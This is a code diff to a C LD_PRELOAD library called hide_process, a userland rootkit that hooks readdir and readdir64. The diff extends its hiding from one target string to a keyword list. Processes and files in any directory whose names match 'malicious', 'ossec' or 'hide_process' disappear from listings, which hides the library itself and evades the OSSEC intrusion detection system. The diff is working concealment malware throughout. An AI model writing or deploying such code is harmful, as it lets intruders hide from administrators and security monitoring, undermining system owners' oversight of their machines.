@@ -11,7 +11,14 @@
 #include <errno.h>
 #include <stdarg.h>
 
-#define TARGET_PROCESS "malicious"
+// Magic keywords to hide - processes/files containing ANY of these will be hidden
+static const char *MAGIC_KEYWORDS[] = {
+    "malicious",
+    "ossec",
+    "hide_process",
+    NULL  // Sentinel to mark end of array
+};
+
 #define MAX_CMDLINE 4096
 
 // Constructor - runs when library is loaded
@@ -20,7 +27,10 @@ static void init(void) {
     fprintf(stderr, "\n");
     fprintf(stderr, "==============================================\n");
     fprintf(stderr, "[hide_process] Library loaded! PID=%d\n", getpid());
-    fprintf(stderr, "[hide_process] Target process: '%s'\n", TARGET_PROCESS);
+    fprintf(stderr, "[hide_process] Magic keywords:\n");
+    for (int i = 0; MAGIC_KEYWORDS[i] != NULL; i++) {
+        fprintf(stderr, "[hide_process]   - '%s'\n", MAGIC_KEYWORDS[i]);
+    }
     fprintf(stderr, "==============================================\n");
     fprintf(stderr, "\n");
     fflush(stderr);
@@ -54,6 +64,22 @@ static struct {
     char path[256];
 } tracked_dirs[MAX_TRACKED_DIRS];
 static int tracked_dir_count = 0;
+
+// Check if a string contains any of the magic keywords
+static int contains_magic_keyword(const char *str) {
+    if (!str) {
+        return 0;
+    }
+
+    for (int i = 0; MAGIC_KEYWORDS[i] != NULL; i++) {
+        if (strstr(str, MAGIC_KEYWORDS[i]) != NULL) {
+            fprintf(stderr, "[hide_process] *** String '%s' contains magic keyword '%s' ***\n",
+                    str, MAGIC_KEYWORDS[i]);
+            return 1;
+        }
+    }
+    return 0;
+}
 
 // Check if a PID's cmdline matches our target process
 static int should_hide_pid(const char *pid_str) {
@@ -98,13 +124,13 @@ static int should_hide_pid(const char *pid_str) {
 
     fprintf(stderr, "[hide_process] PID %s cmdline: '%s'\n", pid_str, cmdline_display);
 
-    // cmdline has null-separated arguments, check if target string appears
-    if (strstr(cmdline, TARGET_PROCESS) != NULL) {
-        fprintf(stderr, "[hide_process] *** MATCH! Hiding PID %s (contains '%s') ***\n", pid_str, TARGET_PROCESS);
+    // cmdline has null-separated arguments, check if any magic keyword appears
+    if (contains_magic_keyword(cmdline)) {
+        fprintf(stderr, "[hide_process] *** MATCH! Hiding PID %s ***\n", pid_str);
         return 1;
     }
 
-    fprintf(stderr, "[hide_process] PID %s does not match '%s'\n", pid_str, TARGET_PROCESS);
+    fprintf(stderr, "[hide_process] PID %s does not match any magic keywords\n", pid_str);
     return 0;
 }
 
@@ -624,10 +650,10 @@ struct dirent *readdir(DIR *dirp) {
             }
         }
 
-        // For ANY directory, check if filename contains target string
-        if (strstr(entry->d_name, TARGET_PROCESS) != NULL) {
-            fprintf(stderr, "[hide_process] *** Hiding file '%s' in directory '%s' (name contains '%s') ***\n",
-                    entry->d_name, dir_path, TARGET_PROCESS);
+        // For ANY directory, check if filename contains any magic keyword
+        if (contains_magic_keyword(entry->d_name)) {
+            fprintf(stderr, "[hide_process] *** Hiding file '%s' in directory '%s' ***\n",
+                    entry->d_name, dir_path);
             fflush(stderr);
             continue;  // Skip this entry, read next one
         }
@@ -682,10 +708,10 @@ struct dirent64 *readdir64(DIR *dirp) {
             }
         }
 
-        // For ANY directory, check if filename contains target string
-        if (strstr(entry->d_name, TARGET_PROCESS) != NULL) {
-            fprintf(stderr, "[hide_process] *** Hiding file '%s' in directory '%s' (name contains '%s') ***\n",
-                    entry->d_name, dir_path, TARGET_PROCESS);
+        // For ANY directory, check if filename contains any magic keyword
+        if (contains_magic_keyword(entry->d_name)) {
+            fprintf(stderr, "[hide_process] *** Hiding file '%s' in directory '%s' ***\n",
+                    entry->d_name, dir_path);
             fflush(stderr);
             continue;  // Skip this entry, read next one
         }
